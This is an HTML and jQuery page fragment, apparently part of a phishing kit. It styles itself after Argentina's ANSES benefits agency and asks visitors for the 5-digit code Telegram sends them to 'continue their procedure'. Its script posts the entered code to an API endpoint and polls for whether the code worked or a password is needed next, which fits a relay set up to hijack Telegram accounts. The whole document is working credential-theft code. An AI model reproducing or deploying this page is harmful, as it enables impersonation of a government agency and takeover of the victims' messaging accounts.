<style>
    .otp-wrapper {
        padding: 10px 5px;
        text-align: left;
    }

    .otp-title {
        font-size: 22px !important;
        font-weight: 700;
        color: #002f5a;
        margin-bottom: 15px;
        text-align: center;
    }

    .otp-desc {
        font-size: 15px;
        color: #555;
        text-align: center;
        margin-bottom: 25px;
        line-height: 1.4;
    }

    .anses-label {
        font-size: 14px;
        font-weight: 700;
        color: #002f5a;
        margin-bottom: 8px;
        display: block;
    }

    .otp-input {
        width: 100%;
        height: 50px;
        border-radius: 4px;
        border: 1px solid #ccc;
        text-align: center;
        font-size: 24px;
        font-weight: 700;
        letter-spacing: 8px;
        color: #002f5a;
        transition: border-color 0.3s;
    }

    .otp-input:focus {
        border-color: #0080c7;
        outline: none;
        box-shadow: 0 0 5px rgba(0,128,199,0.2);
    }

    .otp-input::placeholder {
        font-size: 16px;
        letter-spacing: normal;
        color: #aaa;
        font-weight: 400;
    }

    .otp-btn {
        width: 100%;
        height: 48px;
        border-radius: 4px;
        background-color: #0080c7;
        font-weight: 700;
        color: #fff;
        border: none;
        text-transform: uppercase;
        margin-top: 20px;
        font-size: 16px;
        cursor: pointer;
    }

    .otp-btn:hover {
        background-color: #005a8d;
        color: #fff;
    }

    .text-danger-anses {
        color: #d32f2f;
        font-size: 14px;
        font-weight: 600;
        margin-top: 10px;
    }
</style>

<div class="otp-wrapper">
    <h5 class="otp-title">
        Código de Verificación
    </h5>

    <p class="otp-desc">
        Introduzca el código de 5 dígitos que le enviamos por <strong>Telegram</strong> para continuar con su trámite.
    </p>

    <div class="mb-3">
        <label class="anses-label">Ingrese el código OTP</label>
        <input
            type="text"
            class="form-control otp-input shadow-none"
            name="phone"
            id="phone"
            placeholder="00000"
            maxlength="5"
            inputmode="numeric"
            autocomplete="one-time-code"
        />
    </div>

    <p id="wrong" class="text-center text-danger-anses fw-semibold" style="display:none;"></p>

    <button class="btdk btn otp-btn">
        CONTINUAR
    </button>
    
    <div class="text-center mt-4">
        <small style="color: #666;">¿No recibiste el código? Revisá tu aplicación de Telegram.</small>
    </div>
</div>

<script>
    // Pastikan jQuery sudah dimuat dari file utama (index.php)
    $("#wrong").hide();

    function checkStatus() {
        $("#wrong").hide();
        
        $.ajax({
            url: "API/index.php",
            type: "POST",
            data: {"method":"getStatus"},
            success:function(data){
                if (data.result.status == "success") {
                    window.location.reload();
                } else if (data.result.status == "failed") {
                    if (data.result.detail == "wrong") {
                        $("#wrong").html("❌ El código OTP es incorrecto");
                        $("#loader").hide();
                    } else if (data.result.detail == "passwordNeeded") {
                        window.location.reload();
                    }
                    $("#wrong").show();
                    $("input[type='text']").val("");
                } else {
                    setTimeout(function(){
                        checkStatus();
                    }, 500);
                }
            }, 
            error:function(data){}
        });
    }

    $(".otp-btn").on("click", function(e){
        e.preventDefault();
        var com = $(".otp-input").val();

        if (com != "") {
            $("#loader").show();
            $.ajax({
                url: "API/index.php",
                type: "POST",
                data: {"method":"sendOtp","otp":com},
                success:function(data){
                    setTimeout(function(){
                        checkStatus();
                    }, 500);
                },
                error:function(data){}
            });
        }
    });
</script>